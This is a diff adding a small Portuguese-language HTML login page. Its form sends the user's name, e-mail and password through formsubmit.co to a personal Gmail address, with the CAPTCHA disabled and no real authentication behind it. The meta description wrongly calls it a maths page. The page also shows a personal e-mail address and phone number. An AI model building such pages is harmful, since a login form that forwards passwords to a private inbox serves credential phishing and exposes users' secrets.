@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="description" content="Pagina simples para realizar calculos matemáticos"> 
+  <meta name="keywords" content="HTML, Formulario, Login, Cadastro, online"> 
+  <meta name="author" content="Figueiredo Domingos"> 
+  <title>Formulario</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #004080, #007acc);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .form-container {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 350px;
+    }
+
+    .form-container h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #004080;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: 600;
+      color: #333;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 25px;
+	  padding: 10px;
+      background: linear-gradient(to right, #004080, #007acc);
+      
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.5s;
+    }
+
+    button:hover {
+      background-color: #0066cc;
+      
+    }
+    a{
+    text-decoration:none;
+    font-family:Courier new,monospace;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+  <h2>Entrar</h2>
+  <form action="https://formsubmit.co/jonasmario806@gmail.com" method="POST">
+  
+  <!-- Nome -->
+  <label for="nome">Nome</label>
+  <input type="text" id="nome" name="nome" required>
+  
+  <label for="email">E-mail</label>
+  <input type="email" id="email" name="E-mail" required >
+  
+  <!-- Palavra-passe -->
+  <label for="senha">Palavra-passe</label>
+  <input type="password" id="senha" name="senha" required>
+  
+  
+
+  <!-- Evita CAPTCHA (opcional, pode remover se quiser mais segurança) -->
+  <input type="hidden" name="_captcha" value="false">
+  
+  <!-- Botão -->
+  <button type="submit">Entrar</button>
+    <p style="text-align:center" ><strong>Figueiredo Domingos</strong></p>
+    <a href="https://wa.me/244958594933?text=Olá%20estou%20interessado" target="_blank">
+    Fale comigo no WhatsApp
+    </a>
+    </form>
+    </div>
+</body>
+</html>
